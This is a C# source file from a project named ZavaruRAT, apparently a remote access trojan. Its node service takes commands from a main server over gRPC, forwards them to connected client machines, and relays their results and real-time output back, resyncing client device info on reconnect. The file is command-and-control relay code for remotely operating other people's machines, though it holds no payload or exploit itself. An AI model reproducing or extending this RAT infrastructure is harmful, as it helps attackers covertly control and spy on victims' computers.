#region

using Google.Protobuf;
using Grpc.Core;
using MessagePack;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using ZavaruRAT.Node.Runtime;
using ZavaruRAT.Proto;
using ZavaruRAT.Shared;
using ZavaruRAT.Shared.Models.Client;
using ZavaruRAT.Shared.Models.Node;

#endregion

namespace ZavaruRAT.Node.Services;

public sealed class ZavaruNodeService : BackgroundService
{
    private readonly MainServerClient _server;
    private readonly ZavaruClientsStorage _storage;
    private readonly NodeCommandsExecutor _nodeExecutor;
    private readonly ILogger<ZavaruNodeService> _logger;

    public ZavaruNodeService(MainServerClient server, ZavaruClientsStorage storage, NodeCommandsExecutor nodeExecutor,
                             ILogger<ZavaruNodeService> logger)
    {
        _server = server;
        _storage = storage;
        _nodeExecutor = nodeExecutor;
        _logger = logger;
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        await Task.Yield();

        while (!stoppingToken.IsCancellationRequested)
        {
            try
            {
                await ExecuteLoop(stoppingToken);
            }
            catch (Exception e)
            {
                _logger.LogError(e, "Error while executing node loop");
            }

            var isConnected = await _server.TryReconnect();
            if (isConnected)
            {
                var req = new ResyncClientsRequest
                {
                    Clients =
                    {
                        _storage.Clients.Select(x => new ClientConnectedEvent
                        {
                            Id = x.Id.ToString(),
                            DeviceInfo = x.DeviceInfo.ToProto()
                        })
                    }
                };
                await _server.ResyncClientsAsync(req, stoppingToken);
            }

            await Task.Delay(5, stoppingToken);
        }
    }

    private async Task ExecuteLoop(CancellationToken cancellationToken)
    {
        var call = _server.SubscribeToCommands(cancellationToken);
        if (call == null)
        {
            _logger.LogWarning("Unable to subscribe to commands");
            return;
        }

        var commands = call
                       .ResponseStream
                       .ReadAllAsync(cancellationToken);

        _logger.LogInformation("Waiting for commands");
        await foreach (var command in commands.WithCancellation(cancellationToken))
        {
            _logger.LogInformation("New command from server: {Command}", command);

            await Task.Factory.StartNew(async () => await ExecuteCommandAsync(command), TaskCreationOptions.LongRunning)
                      .ConfigureAwait(false);
        }

        call.Dispose();

        _logger.LogInformation("Ended receiving commands from server");
    }

    private async Task ExecuteCommandAsync(CommandEvent command)
    {
        var id = Guid.Parse(command.ClientId);
        var storedClient = _storage.Find(id);

        if (storedClient == null)
        {
            await _server.SendCommandExecutedAsync(new CommandExecutedEvent
            {
                Success = false,
                ClientId = command.ClientId,
                HashId = command.HashId,
                Result = ByteString.CopyFrom(MessagePackSerializer.Serialize(ClientNotFound.Instance,
                                                                             ZavaruClient.SerializerOptions))
            });
            return;
        }

        if (_nodeExecutor.IsNodeCommand(command))
        {
            await _nodeExecutor.ExecuteNodeCommand(command, storedClient);
            return;
        }

        await storedClient.Client.SendAsync(new Command
        {
            Id = command.HashId,
            CommandName = command.Command,
            Args = command.Args.ToByteArray()
        });
        var result = await storedClient.Client.ReceiveAsync<CommandResult>();

        _logger.LogInformation("Received command result {CommandResult}", result);

        if (result?.Status == CommandResultStatus.RealTime)
        {
            await _server.SendCommandExecutedAsync(new CommandExecutedEvent
            {
                Success = result?.Status == CommandResultStatus.RealTime,
                ClientId = command.ClientId,
                HashId = command.HashId
            });

            await ProcessRealTime(command, storedClient);
        }

        await _server.SendCommandExecutedAsync(new CommandExecutedEvent
        {
            Success = result?.Status == CommandResultStatus.Success,
            ClientId = command.ClientId,
            HashId = command.HashId,
            Result =
                ByteString.CopyFrom(MessagePackSerializer.Serialize(result?.Result ?? Array.Empty<byte>(),
                                                                    ZavaruClient.SerializerOptions))
        });
    }

    private async Task ProcessRealTime(CommandEvent command, ZavaruStoredClient client)
    {
        while (true)
        {
            _logger.LogInformation("Waiting for real time command result");

            var result = await client.Client.ReceiveAsync<CommandResult>();
            if (result?.Status == CommandResultStatus.Success)
            {
                _logger.LogInformation("Real time command break");
                break;
            }

            _logger.LogInformation("Real time command result {CommandResult}", result);

            await _server.SendCommandExecutedAsync(new CommandExecutedEvent
            {
                Success = result?.Status == CommandResultStatus.RealTime,
                ClientId = command.ClientId,
                HashId = command.HashId,
                Result =
                    ByteString.CopyFrom(MessagePackSerializer.Serialize(result?.Result ?? Array.Empty<byte>(),
                                                                        ZavaruClient.SerializerOptions))
            });
        }
    }
}
